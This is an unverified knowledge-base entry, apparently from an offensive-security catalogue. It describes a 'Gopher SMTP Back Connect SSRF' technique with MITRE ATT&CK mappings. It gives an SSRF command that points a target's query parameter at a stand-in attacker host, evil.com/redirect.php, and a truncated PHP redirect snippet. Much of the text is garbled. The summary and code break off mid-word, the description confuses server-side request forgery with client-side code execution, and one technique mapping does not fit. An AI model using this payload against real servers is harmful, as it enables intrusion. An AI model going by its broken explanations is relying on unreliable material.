---
id: b12e1c35-d544-44b6-96ee-c9a11bcb7ac6
name: Gopher SMTP Back Connect SSRF
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:37.948396+00:00'
updated_at: '2023-04-10T20:24:09.768176+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
- '[[Kernel Modules and Extensions|T1215 - Kernel Modules and Extensions]]'
tags:
- '[[Gopher]]'
- '[[Gopher SMTP - Back connect to 1337]]'
- '[[Server-Side Request Forgery]]'
- '[[SSRF exploitation via URL Scheme]]'
commands:
- '[[Query evil.com/redirect.php]]'
---

# Gopher SMTP Back Connect SSRF

## Summary

The Gopher SMTP Back Connect SSRF technique is an attack that leverages a Server-Side Request Forgery vulnerability to send crafted requests to a target server. The attack exploits the gopher protocol to make a connection to a remote server on port 1337. This connection can then be used to establis

## Description

# Description

The Gopher SMTP Back Connect SSRF technique is an attack that leverages a Server-Side Request Forgery vulnerability to send crafted requests to a target server. The attack exploits the gopher protocol to make a connection to a remote server on port 1337. This connection can then be used to establish a backdoor into the target environment. This technique can be used to bypass network restrictions and access resources that are not directly accessible from the internet.

Technical Explanation: The attacker sends a crafted request to the target server that includes a URL with a gopher protocol scheme. The URL includes a payload that instructs the server to connect to a remote server on port 1337. Once the connection is established, the attacker can use it to access resources on the target server that are not directly accessible from the internet.

Business Value: This technique can be used by attackers to gain access to sensitive resources that are not directly accessible from the internet. By establishing a backdoor into the target environment, the attacker can bypass network restrictions and gain access to valuable data.

## Requirements

1. Access to a server with a Server-Side Request Forgery vulnerability

1. Ability to send crafted requests to the target server

## Defense

1. Implement input validation to prevent Server-Side Request Forgery vulnerabilities

1. Implement network segmentation to prevent attackers from accessing sensitive resources

1. Use a web application firewall to detect and block SSRF attacks

## Objectives

1. Establish a backdoor into the target environment

1. Bypass network restrictions

1. Access sensitive resources that are not directly accessible from the internet

# Instructions

1. Use this command to redirect a user to a malicious site through the gopher protocol.

**Code**: [[Content of evil.com/redirect.php:
<?php
header("Lo]]

> This command works by creating a header that redirects the user to a malicious site through the gopher protocol. The gopher protocol is used to access information on the internet and can be used to execute malicious code on a user's system. The user will be redirected to the specified site and may unknowingly execute the malicious code.

**Command** ([[Query evil.com/redirect.php]]):

```bash
https://example.com/?q=http://evil.com/redirect.php
```

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]
- [[Kernel Modules and Extensions|T1215 - Kernel Modules and Extensions]]

## Commands Used

- [[Query evil.com/redirect.php]]

## Tags

- [[Gopher]]
- [[Gopher SMTP - Back connect to 1337]]
- [[Server-Side Request Forgery]]
- [[SSRF exploitation via URL Scheme]]
